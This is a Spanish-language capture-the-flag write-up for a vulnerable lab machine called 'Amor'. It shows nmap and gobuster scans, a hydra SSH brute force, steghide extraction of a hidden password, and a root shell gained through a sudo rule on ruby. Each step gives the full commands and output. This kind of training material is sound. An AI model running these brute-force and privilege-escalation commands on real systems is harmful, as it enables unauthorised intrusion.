# 🎯 Writeup: Máquina Amor
**Por: Dani-kl**

Este es un writeup detallado sobre la resolución de la máquina Amor. Durante este ejercicio, abarcaremos fases de reconocimiento de puertos, enumeración de servicios web, ataques de fuerza bruta por SSH, técnicas de esteganografía y escalada de privilegios abusando de configuraciones de sudo.

### 🛠 1. Despliegue del Entorno
Comenzamos desplegando la máquina vulnerable utilizando el script de despliegue automatizado proporcionado.

```bash
sudo bash auto_deploy.sh amor.tar
```

El script nos proporciona la dirección IP objetivo (`172.17.0.2`). Al interactuar con el servicio web a través del navegador, logramos enumerar un nombre de usuario potencial para nuestra fase de intrusión: **carlota**.

### 🔍 2. Fase de Enumeración (Reconnaissance)

**Escaneo de Puertos**
Para tener un mapa claro de la superficie de ataque, realizamos un escaneo exhaustivo utilizando `nmap`. Los parámetros `-p-` nos garantizan cubrir los 65535 puertos, mientras que `-Pn` desactiva el descubrimiento de hosts mediante ping, lo cual es vital para evadir posibles restricciones de firewall.

```bash
nmap -p- -Pn 172.17.0.2
```

```text
Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-10-01 12:22 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

El escaneo revela dos servicios críticos en ejecución: el puerto 22 (SSH) y el puerto 80 (HTTP).

**Fuzzing de Directorios Web**
Con el puerto 80 abierto, procedemos a enumerar directorios y archivos ocultos en el servidor utilizando `gobuster` en modo directorio, apoyándonos del diccionario `common.txt`.

```bash
gobuster dir -u [http://172.17.0.2/](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```text
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     [http://172.17.0.2/](http://172.17.0.2/)
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php              (Status: 403) [Size: 275]
.htpasswd             (Status: 403) [Size: 275]
index.html            (Status: 200) [Size: 3033]
javascript            (Status: 301) [Size: 313] [--> [http://172.17.0.2/javascript/](http://172.17.0.2/javascript/)]
===============================================================
Finished
===============================================================
```

El escaneo descubre los archivos estándar `index.html` y un directorio `javascript`, además de archivos de sistema que retornan un estado 403. Al no encontrar vectores claros aquí, pivotamos al servicio SSH.

### 🚪 3. Acceso Inicial (Initial Access)

**Ataque de Fuerza Bruta (SSH)**
Teniendo un servicio SSH expuesto y un nombre de usuario válido (`carlota`), ejecutamos un ataque de fuerza bruta con `hydra` y la wordlist `rockyou.txt`.

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt.gz 172.17.0.2 ssh -t 4 -f -V
```

```text
[ATTEMPT] target 172.17.0.2 - login "carlota" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "carlota" - pass "rockyou" - 8 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "carlota" - pass "12345678" - 9 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "carlota" - pass "babygirl" - 13 of 14344399 [child 3] (0/0)
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

El ataque es exitoso. Establecemos nuestra conexión SSH para obtener la shell inicial:

```bash
ssh carlota@172.17.0.2
```

### 🔄 4. Movimiento Lateral (Lateral Movement)

**Exploración Interna y Esteganografía**
Al navegar por el sistema, ingresamos a la carpeta `Desktop/vacaciones`, donde descubrimos un archivo sospechoso: `imagen.jpg`. Utilizamos la herramienta `steghide` para inspeccionar el archivo:

```bash
steghide info imagen.jpg
```

Al confirmar un archivo `.txt` incrustado, lo extraemos (si pide contraseña, presionamos Enter):

```bash
steghide extract -sf imagen.jpg
```

**Decodificación y Pivot**
El archivo `.txt` extraído contiene una cadena en Base64. La decodificamos directamente:

```bash
cat secreto.txt | base64 -d
```

Esto nos otorga una nueva contraseña. Sabiendo que existe el usuario **oscar** en el sistema, reutilizamos estas credenciales para lograr un movimiento lateral.

```bash
ssh oscar@172.17.0.2
```

```text
oscar@172.17.0.2's password: 
$ whoami
oscar
```

### 🚀 5. Escalada de Privilegios (Privilege Escalation)

Auditamos los privilegios asignados a nuestro usuario actual:

```bash
sudo -l
```

```text
Matching Defaults entries for oscar on 45d21f241f57:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User oscar may run the following commands on 45d21f241f57:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Detectamos que el usuario `oscar` tiene permisos para ejecutar el binario `ruby` como root sin contraseña (`NOPASSWD`).

**Abuso de binarios (GTFOBins)**
Nos aprovechamos de este permiso para invocar una shell interactiva del sistema (`/bin/sh`) a través de Ruby con privilegios de superusuario:

```bash
sudo ruby -e 'exec "/bin/sh"'
```

Validamos nuestra intrusión verificando que poseemos privilegios máximos:

```bash
whoami
```

```text
root
```

**Post-Explotación**
Como root, nos dirigimos al directorio de escritorio del superusuario para leer la flag final.

```bash
cd Desktop
ls
cat IMPORTANTE.txt
```

```text
Hola ROOT, acuérdate de mirar el documento de tu escritorio.
```